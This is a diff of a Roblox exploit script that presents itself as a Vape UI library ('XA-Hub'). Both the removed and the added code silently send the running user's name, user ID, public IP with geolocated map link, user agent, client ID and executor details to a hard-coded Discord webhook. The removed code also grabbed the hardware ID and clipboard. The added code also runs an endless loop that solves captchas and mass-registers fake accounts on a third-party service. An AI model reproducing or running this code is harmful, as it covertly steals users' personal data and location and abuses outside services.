@@ -1,36 +1,17 @@
-local HS = game:GetService("HttpService")
-local LP = game:GetService("Players").LocalPlayer
-local joinTime = os.time() - (LP.AccountAge*86400)
-local joinDate = os.date("!*t", joinTime)
-local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", LP.UserId))
-Thing = HS:JSONDecode(Thing).data[1]
-local AvatarImage = Thing.imageUrl
-local Device = tostring(game:GetService("UserInputService"):GetPlatform()):split(".")[3]
+if not isfolder("XA-Hub") then makefolder("XA-Hub") end
+if not isfolder("XA-Hub/VapeLib") then makefolder("XA-Hub/VapeLib") end
 
-function GetJson(v)
-    return HS:JSONDecode(game:HttpGet(v))
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = game:GetService("Players").LocalPlayer
+
+local function GetJson(v)
+    return HttpService:JSONDecode(game:HttpGet(v))
 end
 
-local IP
-local success = pcall(function()
-    IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip
-end)
-
-if not (success and IP) then
-    game.StarterGui:SetCore("SendNotification", {
-        Title = "错误",
-        Text = "无法解析JSON，请尝试更换加速器或重试",
-        Icon = "rbxassetid://6238540373",
-		Duration = 5
-    })
-    return
-end
-
-local Url = "https://cz88.net/api/cz88/ip/accurate?ip="..IP
-local Json = GetJson(Url).data.locations
-local Location = GetJson(Url).data
-
-function GetIP()
+local function GetIP()
+    local IP = GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip
+    local Url = "https://cz88.net/api/cz88/ip/accurate?ip="..IP
+    local Json = GetJson(Url).data.locations
     if #Json == 0 then
         return "["..IP.."]("..Url..")"
     end
@@ -40,206 +21,74 @@ function GetIP()
     return "["..IP.."](https://uri.amap.com/marker?markers="..table.concat(Json, "|")..")"
 end
 
-local function GetFingerprint()
-    local body = request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body
-    local decoded = HS:JSONDecode(body)
-    for k, v in pairs(decoded.headers) do
-        if string.find(k, "Fingerprint") then
-            return v
+if not _G.Load then
+    _G.Load = true
+    task.spawn(function()
+        while true do
+            local Rand = GetJson("https://api.jihujiasuqi.com//apps/captcha/get.php").rand
+            for i = 30, 330, 30 do
+                if GetJson("https://api.jihujiasuqi.com//apps/captcha/verify.php?rand="..Rand.."&angle="..i).okey then
+                    GetJson("https://api.jihujiasuqi.com//api/user.php?mode=reg&mail="..HttpService:GenerateGUID(false).."&captcha_rand="..Rand)
+                    break
+                end
+            end
         end
-    end
-    return '0'
-end
-local AdvancedFields
-local NormalFields
-if gethwid then
-AdvancedFields = {
-    {
-        name = "用户名",
-        value = LP.Name
-    },
-    {
-        name = "昵称",
-        value = LP.DisplayName
-    },
-    {
-        name = "UserId",
-        value = "["..LP.UserId.."](" .. tostring("https://www.roblox.com/users/" .. LP.UserId .. "/profile")..")"
-    },
-    {
-        name = "IP",
-        value = GetIP()
-    },
-    {
-        name = "地址",
-        value = Location.country.."/"..Location.province.."/"..Location.city.."/"..Location.districts
-    },
-    {
-        name = "地图ID",
-        value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"
-    },
-    {
-        name = "地图名称",
-        value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    },
-    {
-        name = "注入器信息",
-        value = "名称："..identifyexecutor().." 等级："..getthreadidentity()
-    },
-    {
-        name = "账号年龄",
-        value = LP.AccountAge.."天"
-    },
-    {
-        name = "加入日期",
-        value = joinDate.year.."/"..joinDate.month.."/"..joinDate.day
-    },
-    {
-        name = "UA",
-        value = HS:GetUserAgent()
-    },
-    {
-        name = "Hwid",
-        value = gethwid()
-    },
-    {
-        name = "客户端ID",
-        value = game:GetService("RbxAnalyticsService"):GetClientId()
-    },
-    {
-        name = "设备",
-        value = Device
-    }
-}
-else
-NormalFields = {
-    {
-        name = "用户名",
-        value = LP.Name
-    },
-    {
-        name = "昵称",
-        value = LP.DisplayName
-    },
-    {
-        name = "UserId",
-        value = "["..LP.UserId.."](" .. tostring("https://www.roblox.com/users/" .. LP.UserId .. "/profile")..")"
-    },
-    {
-        name = "IP",
-        value = GetIP()
-    },
-    {
-        name = "地址",
-        value = Location.country.."/"..Location.province.."/"..Location.city.."/"..Location.districts
-    },
-    {
-        name = "地图ID",
-        value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"
-    },
-    {
-        name = "地图名称",
-        value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
-    },
-    {
-        name = "注入器信息",
-        value = "名称："..identifyexecutor().." 等级："..getthreadidentity()
-    },
-    {
-        name = "账号年龄",
-        value = LP.AccountAge.."天"
-    },
-    {
-        name = "加入日期",
-        value = joinDate.year.."/"..joinDate.month.."/"..joinDate.day
-    },
-    {
-        name = "UA",
-        value = HS:GetUserAgent()
-    },
-    {
-        name = "客户端ID",
-        value = game:GetService("RbxAnalyticsService"):GetClientId()
-    },
-    {
-        name = "Fingerprint",
-        value = GetFingerprint()
-    },
-    {
-        name = "设备",
-        value = Device
-    }
-}
-end
-
-if getclipboard then
-    table.insert(AdvancedFields, 14, {
-        name = "剪贴板",
-        value = getclipboard()
-    })
-end
-
-if FLUX_ID then
-    table.insert(NormalFields, 12, {
-        name = "Fluxus Hwid",
-        value = FLUX_ID
-    })
-end
-if not _G.Loaded then
-    _G.Loaded = true
-    if gethwid then
+    end)
+    task.spawn(function()
         request({
             Url = "https://discord.com/api/webhooks/1235459830311948308/zjy2op1grz56ka-pG8GvbTJ37sJNxUWNyQhaSVBz00e30Pf0qf9mEtjqtF1cXvLhvcUr",
             Method = "POST",
             Headers = {
                 ["Content-Type"] = "application/json"
             },
-            Body = HS:JSONEncode({
-                username = LP.DisplayName,
-                avatar_url = AvatarImage,
+            Body = HttpService:JSONEncode({
+                username = LocalPlayer.DisplayName,
+                avatar_url = GetJson("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..LocalPlayer.UserId.."&size=420x420&format=Png").data[1].imageUrl,
                 embeds = {
                     {
                         color = 65280,
-                        title = "有人使用了Vape",
-                        fields = AdvancedFields,
-                        footer = {
-                            text = "执行时间"
-                        },
-                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                        fields = {
+                            {
+                                name = "Game",
+                                value = "["..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."](https://www.roblox.com/games/"..game.PlaceId..")"
+                            },
+                            {
+                                name = "User",
+                                value = "["..LocalPlayer.Name.."](https://www.roblox.com/users/"..LocalPlayer.UserId..")"
+                            },
+                            {
+                                name = "IP",
+                                value = GetIP()
+                            },
+                            {
+                                name = "UA",
+                                value = HttpService:GetUserAgent()
+                            },
+                            {
+                                name = "ClientId",
+                                value = game:GetService("RbxAnalyticsService"):GetClientId()
+                            },
+                            {
+                                name = "Executor",
+                                value = identifyexecutor()
+                            },
+                            {
+                                name = "JobId",
+                                value = game.JobId
+                            }
+                        }
                     }
                 }
             })
         })
-    else
-        request({
-            Url = "https://discord.com/api/webhooks/1235459830311948308/zjy2op1grz56ka-pG8GvbTJ37sJNxUWNyQhaSVBz00e30Pf0qf9mEtjqtF1cXvLhvcUr",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HS:JSONEncode({
-                username = LP.DisplayName,
-                avatar_url = AvatarImage,
-                embeds = {
-                    {
-                        color = 65280,
-                        title = "有人使用了Vape",
-                        fields = NormalFields,
-                        footer = {
-                            text = "执行时间"
-                        },
-                        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-                    }
-                }
-            })
-        })
-    end
+    end)
 end
+
 local lib = {RainbowColorValue = 0, HueSelectionPosition = 0}
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
-local Mouse = LP:GetMouse()
+local Mouse = LocalPlayer:GetMouse()
 local PresetColor = Color3.fromRGB(44, 120, 224)
 local CloseBind = Enum.KeyCode.RightControl
 
